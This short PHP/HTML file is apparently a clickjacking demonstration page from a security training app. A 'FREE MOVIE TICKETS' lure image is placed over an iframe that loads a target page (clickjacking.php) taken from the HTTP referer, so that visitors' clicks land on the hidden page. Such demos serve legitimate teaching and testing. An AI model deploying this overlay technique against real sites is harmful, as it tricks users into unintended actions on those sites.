<?php

// phpinfo();

// echo dirname($_SERVER['HTTP_REFERER']).'/clickjacking.php';
// exit();

?>
<!DOCTYPE html>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>FREE MOVIE TICKETS</title>

</head>

<body>

<!-- The z-index property specifies the stack order of an element.
An element with greater stack order is always in front of an element with a lower stack order. -->

<div style="position:absolute; top:0px; left:0px; width:1000px; height:525px; background:white; z-index:10;">

	<img alt="" src="../images/free_tickets.png">

</div>

<iframe style="position:absolute; top:70px; left:0px; width:1000px; height:1000px;" src="<?php echo dirname($_SERVER['HTTP_REFERER']).'/clickjacking.php'; ?>" frameborder="0"></iframe>

</body>

</html>